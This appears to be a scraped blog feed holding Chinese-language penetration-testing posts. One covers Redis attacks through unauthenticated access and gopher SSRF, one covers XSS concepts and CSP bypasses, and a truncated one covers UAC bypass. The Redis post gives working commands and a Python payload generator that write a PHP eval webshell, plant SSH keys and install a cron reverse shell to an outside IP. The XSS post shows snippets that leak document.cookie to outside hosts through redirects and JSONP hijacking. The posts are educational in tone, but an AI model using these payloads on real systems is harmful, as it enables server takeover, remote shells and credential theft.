    <summary type="html">&lt;h1 id=&quot;apache&quot;&gt;&lt;a href=&quot;#apache&quot; class=&quot;headerlink&quot; title=&quot;apache&quot;&gt;&lt;/a&gt;apache&lt;/h1&gt;&lt;h3 id=&quot;apache文件多后缀名解析漏洞&quot;&gt;&lt;a href=&quot;#apache文件多后缀名解析漏洞&quot; cla</summary>
      
    
    
    
    
    <category term="中间件安全" scheme="http://const27.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>redis的一些攻击方式</title>
    <link href="http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:13.411Z</published>
    <updated>2021-06-28T13:43:22.470Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><p>Redis默认端口6379<br>如果存在未授权问题，那么任何人都可以往这台Redis服务器上传输命令</p><p>一般Redis攻击有<br>写shell（最常用），写密钥，写crontab反弹shell, info获得敏感信息,其中写密钥和写crontab不是那么的好用</p><p>在讲攻击之前，要讲一下RESP协议</p><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>Redis服务器与客户端通过RESP协议的通信。<br>resp协议从redis1.2引入。<br>这个协议把服务器与客户端之间的数据以一种序列化的形式处理并传输</p><p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>，发送给服务器的命令就是放在数组中的BulkStrings类型<br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p><p>同时每个类型字节后紧跟着该类型的长度，然后是CRLF，然后是该类型的值</p><p>说了这么多，肯定不会很懂，上图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143000.png" alt="QQ截图20210219143000"></p><p>即发送的时候，是用三个元素的数组(*3),第一个元素是三个长度的BulkString($3)其值为set,第二个元素是四个长度的BulkSting($4)其值为name,第三个元素是四个长度长的BulkString($4)其值为test,服务器返回SimpleString（+）OK，以下类推</p><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>是http协议出现常用的一个协议，SSRF的万金油。</p><p>格式：gopher://IP:port/_{TCP/IP数据流}</p><h2 id="如何redis远程链接"><a href="#如何redis远程链接" class="headerlink" title="如何redis远程链接"></a>如何redis远程链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h ip -p port</span><br><span class="line">xxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot;  (未授权就不需要输入密码)</span><br></pre></td></tr></table></figure><h2 id="攻击方法一-写shell"><a href="#攻击方法一-写shell" class="headerlink" title="攻击方法一:写shell"></a>攻击方法一:写shell</h2><p>写shell的话,redis需执行的命令应该类似这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果你能直接redis -h ip -n 6379  未授权连接上redis服务器且权限够高，可以直接输入以下命令</span><br><span class="line">flushall  &#x2F;&#x2F;清空数据库</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;   &#x2F;&#x2F;为键名为1的键赋值</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php     &#x2F;&#x2F;设置数据存储到磁盘时的文件路径</span><br><span class="line">save    &#x2F;&#x2F;数据库全部保存至磁盘</span><br></pre></td></tr></table></figure><p>攻击脚本如下(主要用于ssrf)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3</span><br><span class="line">import urllib</span><br><span class="line">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class="line">ip&#x3D;&quot;192.168.163.128&quot;</span><br><span class="line">port&#x3D;&quot;6379&quot;</span><br><span class="line">shell&#x3D;&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class="line"> &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),&#x2F;&#x2F;这里的IFS替换不是很理解是啥意思..</span><br><span class="line"> &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line"> &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line"> &quot;save&quot;</span><br><span class="line"> ]</span><br><span class="line">if passwd:</span><br><span class="line">cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))   &#x2F;&#x2F;如果需要密码，就把密码输入命令加入到cmd第一位</span><br><span class="line">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">CRLF&#x3D;&quot;\r\n&quot;</span><br><span class="line">redis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class="line">cmd&#x3D;&quot;&quot;</span><br><span class="line">cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">for x in redis_arr:</span><br><span class="line">cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">cmd+&#x3D;CRLF</span><br><span class="line">return cmd</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">for x in cmd:</span><br><span class="line">payload +&#x3D; urllib.quote(redis_format(x))</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>这样的话，我们就得到了payload，直接curl一下，就写入shell了</p><h2 id="攻击方法二-info获取敏感信息"><a href="#攻击方法二-info获取敏感信息" class="headerlink" title="攻击方法二:info获取敏感信息"></a>攻击方法二:info获取敏感信息</h2><p>连上后 使用info命令</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143019.png" alt="QQ截图20210219143019"></p><h2 id="攻击方法三：写入ssh公钥"><a href="#攻击方法三：写入ssh公钥" class="headerlink" title="攻击方法三：写入ssh公钥"></a>攻击方法三：写入ssh公钥</h2><p>高版本不好用，因为高版本的redis权限是无法往/root目录写入的.<br>而这个方法则需要往/root/.ssh写入ssh公钥达到无密码ssh链接的目的</p><p>首先在攻击机上生成一对不需要密码的公钥私钥</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143031.png" alt="QQ截图20210219143031"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143103.png" alt="QQ截图20210219143103"></p><p>然后依次输入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dirfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>然后ssh免密登录 ssh -i id_rsa root@ip</p><h2 id="攻击方法四：利用cron计划任务反弹shell"><a href="#攻击方法四：利用cron计划任务反弹shell" class="headerlink" title="攻击方法四：利用cron计划任务反弹shell"></a>攻击方法四：利用cron计划任务反弹shell</h2><p>仅在centos系统奏效，Ubuntu不行</p><ol><li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令如下</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.131&#x2F;888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>把上面那个脚本改改就能实现ssrf了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考 &lt;a href=&quot;https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/&quot;&gt;https://www.redteamin</summary>
      
    
    
    
    
    <category term="外围打点" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>XSS的一些基本概念</title>
    <link href="http://const27.com/2021/06/28/%E9%87%8D%E6%B8%A9XSS/"/>
    <id>http://const27.com/2021/06/28/%E9%87%8D%E6%B8%A9XSS/</id>
    <published>2021-06-28T13:52:13.409Z</published>
    <updated>2021-06-28T13:40:58.776Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="同源策略与跨域"><a href="#同源策略与跨域" class="headerlink" title="同源策略与跨域"></a>同源策略与跨域</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h3><p>若两个URL 协议，端口，host都相同，则这两个URL同源。<br>这个方案叫做“协议/主机/端口元组”，或者直接是 “元组”</p><p>同源策略又分为DOM同源策略(禁止对不同源的页面的DOM进行操作)和XMLHttpRequest(禁止XHR对象项不同源的服务器地址发起HTTP请求)同源策略</p><h3 id="同源策略的作用"><a href="#同源策略的作用" class="headerlink" title="同源策略的作用"></a>同源策略的作用</h3><p>限制一个JS脚本对不同源的URL进行操作。</p><p>这么说可能会有点抽象，那不如看看下面的例子:</p><p>1.如果没有DOM同源策略，就意味着一个页面可以对任意页面的DOM进行操作。那么就会导致以下安全问题:<br>做一个假网站，并插入一个占满全页面的iframe指向一个登陆界面如银行登录界面。用户进来后会发现除了域名不同，其他都和正常的银行登陆界面一致。若用户输入了账号密码，那么我们就可以跨域读取到银行登陆界面的dom树，从而读取用户输入的账号密码。</p><p>2.如果没有XMLHttpRequest，就意味着可以一个页面可以向任意页面发起HTTP请求。那么就会导致以下安全问题:<br>当一个用户登陆了某个系统，如银行个人系统，此时银行网站会给用户返回cookie。如果用户此时访问了我们的恶意网站，就会执行我们恶意网站中的恶意AJAX代码，此AJAX代码会向银行网站发起HTTP请求，比如发起查询账户余额的请求（此时会默认附带用户的cookie）。银行页面发现cookie无误，就会返回请求的数据:账户余额，造成数据泄露。</p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>上面我们说了同源策略中，一个页面不能对不同源的页面进行操作。但是在实际情况中，还是有一些js标签能摆脱这种束缚,如script标签就能通过src属性获取不同源页面上的js代码，iframe能嵌入不同源站点的资源等等。<br>这样的标签有如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt;</span><br><span class="line">&lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件</span><br><span class="line">@font-face</span><br><span class="line">&lt;frame&gt; 和 &lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>但仅仅是这样，有些时候还是无法达到业务的需求，我们有时需要突破这种限制来达到业务需求，也就是避开同源策略，以下是几种解决方案。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS，即跨域资源共享，它是一个W3C标准，定义了必须访问跨域资源时，浏览器和服务器该如何协商。<br>其实质就是以AJAX为载体，使用自定义HTTP头让浏览器与服务器进行协商，从而决定跨域请求是否应该成功。<br>所以实现CORS通信的关键是服务器是否实现了CORS接口。</p><p>另外，并不是所有浏览器都支持CORS，比如IE6,IE7,Opera min 不支持CORS。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>浏览器把CORS的请求分成两类:简单请求与非简单请求</p><p>简单请求:<br>满足以下条件，即为简单请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请求方法是以下三种方法之一：</span><br><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br><span class="line"></span><br><span class="line">且HTTP的头信息不超出以下几种字段：</span><br><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>只要不满足以上条件，都为非简单请求。</p><p>对于简单请求，其实现原理如下:</p><p>1.在请求头中加一个额外头:Origin, 其包含发出请求的页面的协议，域名，端口，服务器以此来判断是否给予响应。<br>2.服务器收到请求后，判别该Origin指向的站点能否跨域。若能跨域，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）；若不能跨域，则没有这个头部或者源信息不匹配（即Access-Control-Allow-Origin内容非*且与Origin不符）<br>3.同时如果服务器返回的头中有 Access-Control-Allow-Credentials: true ，则说明可以跨域向服务器发送带有cookie的HTTP请求。</p><p>对于非简单请求，它会实现进行预检，其原理如下:<br>1.进行预检，以OPTIONS方法向服务器发送Origin头部，Access-Control-Request-Method头部（接下来的请求方法，如POST），Access-Control-Request-Headers（自定义头部信息，可选）<br>2.服务器响应，有如下头:Access-Control-Allow-Origin,Access-Control-Allow-Methods(允许的请求方法)，Access-Control-Allow-Headers（允许的自定义头部信息），Access-Control-Max-Age（应该将预检请求缓存多长时间，以秒为单位）<br>3.通过预检请求后，以后每次浏览器的CORS请求都会和简单请求一样。</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>我们不妨通过一个例子来窥视JSONP的实现原理。</p><p>我们有如下文件test.html</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;HI&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var fun1&#x3D;function(data)&#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;192.168.111.1&#x2F;a.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>其包含的a.js如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&quot;remote data&quot;);</span><br></pre></td></tr></table></figure><p>访问test.html，成功触发弹窗，我们将test.html中的fun1函数称为回调函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322211050387.png" alt="image-20210322211050387"></p><p>于是就出现了利用这种原理来实现跨域传输数据的方法：JSONP</p><p>下面说说JSONP的具体实现流程:</p><p>客户端:<br>1.定义获取数据后的回调函数<br>2.动态生成服务端JS进行引用的代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关于此处第2点，我们可以说道说道。</span><br><span class="line">我们再用这个方法实现跨域时，怎么让远程JS知道我们本地的回调函数叫什么名字？</span><br><span class="line">这就需要通过一些手段动态生成服务端的JS代码了。</span><br><span class="line">比如我们可以通过get参数来控制其返回的本地回调函数名，如: http:&#x2F;&#x2F;a.com?callback&#x3D;fun1</span><br></pre></td></tr></table></figure><p>服务端:<br>返回由回调函数名包裹的JSON数据，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&#123;</span><br><span class="line">&quot;key1&quot;:&quot;value1&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里为什么要特别强调是JSON呢？因为JSON不仅可以简洁的表述复杂的数据，而且JS原生支持JSON，可以在客户端自由处理JSON数据，所以服务端多传回JSON数据，JSONP这个名字也是这么来的。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p>CSP，即内容安全策略。它通过白名单策略，告诉客户端哪些外部资源可以加载和执行。<br>同时需要注意的是，CSP目前有1.0 2.0 3.0 版本，每个版本的规则都有不同</p><h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>CSP通过定义一系列规则来实现安全管理。</p><p>首先我们来看看一条CSP规则的范例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com; frame-src &#39;none&#39;; object-src &#39;none&#39;</span><br><span class="line">多个CSP指令间用分号隔开，多个指令值之间用空格隔开</span><br></pre></td></tr></table></figure><p>下面是各个指令及其指令值的效果</p><p>摘自<a href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214229302.png" alt="image-20210322214229302"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214238476.png" alt="image-20210322214238476"></p><h2 id="启用CSP"><a href="#启用CSP" class="headerlink" title="启用CSP"></a>启用CSP</h2><p>那么如何启用CSP呢？有两种方式</p><p>1.在HTTP头添加<br>在HTTP头响应添加content-security-policy头并写入CSP规则以后，就能启用CSP了</p><p>图引用于<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214736472.png" alt="image-20210322214736472"></p><p>2.在meta标签里添加<br>向内添加如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br><span class="line">即可</span><br></pre></td></tr></table></figure><h1 id="一些其他XSS保护机制"><a href="#一些其他XSS保护机制" class="headerlink" title="一些其他XSS保护机制"></a>一些其他XSS保护机制</h1><h2 id="X-Frame"><a href="#X-Frame" class="headerlink" title="X-Frame"></a>X-Frame</h2><p>X-Frame-Options 是一个响应头，指定此页面能否在&lt;frame&gt;或者&lt;iframe&gt;中插入.<br>他有三个可选值:</p><ul><li><p>DENY</p><p>页面不能被嵌入到任何iframe或frame中</p></li><li><p>SAMEORIGIN</p><p>页面只能被本站页面嵌入到iframe或者frame中</p></li><li><p>ALLOW-FROM uri</p><p>表示该页面可以在指定来源的 frame 中展示。</p></li></ul><h2 id="XSS-auditor"><a href="#XSS-auditor" class="headerlink" title="XSS auditor"></a>XSS auditor</h2><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>httponly 是一个针对cookie的保护机制。<br>其实现原理是在response中对某一项cookie设置为HTTPONLY=true，从而使该cookie不能被document.cookie 读取。</p><p>我们随便找个网站，发现其captch_session_v2开启了httponly</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115121425.png" alt="image-20210323115121425"></p><p>随后我们通过document.cookie尝试去读取aptch_session_v2的值，发现其值并没有出现在返回内容中<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115228944.png" alt="image-20210323115228944"></p><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>htmlspecialchars是一个php函数，它可以将一些敏感字符转义</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; (AND) &#x3D;&gt; &amp;</span><br><span class="line">&quot; (双引号) &#x3D;&gt; &quot; (当ENT_NOQUOTES没有设置的时候) </span><br><span class="line">&#39; (单引号) &#x3D;&gt; &amp;#039; (当ENT_QUOTES设置) </span><br><span class="line">&lt; (小于号) &#x3D;&gt; &lt; </span><br><span class="line">&gt; (大于号) &#x3D;&gt; &gt; </span><br></pre></td></tr></table></figure><h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><h2 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h2><p>csp，是可以被bypass的。我们接下来就想办法bypass csp来回传cookie</p><p>1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;none&#39;;</span><br></pre></td></tr></table></figure><p>可以通过meta标签实现重定向</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&#x2F;x.php?cookie&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>即，1秒后跳转至指定url</p><p>2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src ‘self’ ‘unsafe-inline’</span><br></pre></td></tr></table></figure><p>开放了内联脚本。我们可以通过window.location,windows.open或者meta标签实现页面跳转。也可以通过动态创建元素实现跳转</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a &#x3D; document.createElement(&quot;a&quot;);</span><br><span class="line">a.href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;+document.cookie;</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure><p>限制了只能加载本域JS脚本，同时禁止了内联脚本执行。<br>不过问题不大，如果我们有一个上传点，我们可以上传一个恶意JS文件，上传后如果我们知道此JS文件上传位置与文件名且上传的位置是本域，然后通过XSS实现加载此恶意JS文件。</p><p>另外在CSP1.0版本中，还可以通过以下方式进行跳转(现在不咋好用了)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; (H5预加载)</span><br><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; （DNS预加载）</span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src http:&#x2F;&#x2F;www.a.com&#x2F;b&#x2F; </span><br></pre></td></tr></table></figure><p>限制了只能从某特定路径去加载JS脚本<br>对此一般的解决方法是看看此目录下有没有可控重定向的文件，比如这种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x2F;302.php</span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</span><br></pre></td></tr></table></figure><p>我们就可以插入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;b&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;a.com&#x2F;upload&#x2F;a.js&quot;&gt;  </span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>去加载我们上传的JS脚本（上传点自己找）</p><h2 id="JSONP-劫持"><a href="#JSONP-劫持" class="headerlink" title="JSONP 劫持"></a>JSONP 劫持</h2><p>简单说一说</p><p>首先存在网站B，它包含登录用户的ID,passwd等敏感信息。且有页面<a href="http://b.com/user?callback=">http://B.com/user?callback=</a>  用来进行JSONP跨域数据传输ID,PASSWD等信息，这是前提。<br>用户登录B后，打开了我们的恶意网站A.com,A.com的内容为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;B.com&#x2F;user?jsonp&#x3D;Callback&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    将获取内容上传至恶意服务器的JS代码.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么A网站就会向网站B跨域请求到敏感信息，并上传到恶意服务器保存。<br>这就是JSONP劫持，此方法常用于水坑攻击</p><h2 id="常用触发点与bypass"><a href="#常用触发点与bypass" class="headerlink" title="常用触发点与bypass"></a>常用触发点与bypass</h2><p><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&quot;同源策略与跨域&quot;&gt;&lt;a href=&quot;#同源策略与跨域&quot; class=&quot;headerlink&quot; title=&quot;同源策略与跨域&quot;&gt;&lt;/a&gt;同源策略与跨</summary>
      
    
    
    
    
    <category term="外围打点" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>BypassUAC技术总结</title>
    <link href="http://const27.com/2021/06/28/Bypass%20UAC/"/>
    <id>http://const27.com/2021/06/28/Bypass%20UAC/</id>
    <published>2021-06-28T13:52:05.780Z</published>
    <updated>2021-06-28T13:40:35.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。<br>管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" alt="image-20210227191310985"></p><p>点击“是”，管理员就会提升到高权限再去运行该任务。</p><h1 id="autoElevate与requestedExecutionLevel"><a href="#autoElevate与requestedExecutionLevel" class="headerlink" title="autoElevate与requestedExecutionLevel"></a>autoElevate与requestedExecutionLevel</h1><h2 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h2><p>当某个EXE文件的文件清单里有&lt;autoElevate&gt; 元素时，当执行该文件时会默认提权执行。<br>我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。<br>适用范围:管理员权限以获得，要得到高权限管理员权限</p><p>一般用工具sigcheck检测</p><p>网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" alt="image-20210301000136728"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" alt="image-20210301000141880"></p><p>这个东西很有用，是下面部分方法的前提条件</p><h2 id="requestedExecutionLevel"><a href="#requestedExecutionLevel" class="headerlink" title="requestedExecutionLevel"></a>requestedExecutionLevel</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" alt="image-20210302125607741"></p><p>有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行</p><p>asInvoker：父进程是什么权限，此应用程序就是什么权限</p><p>requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" 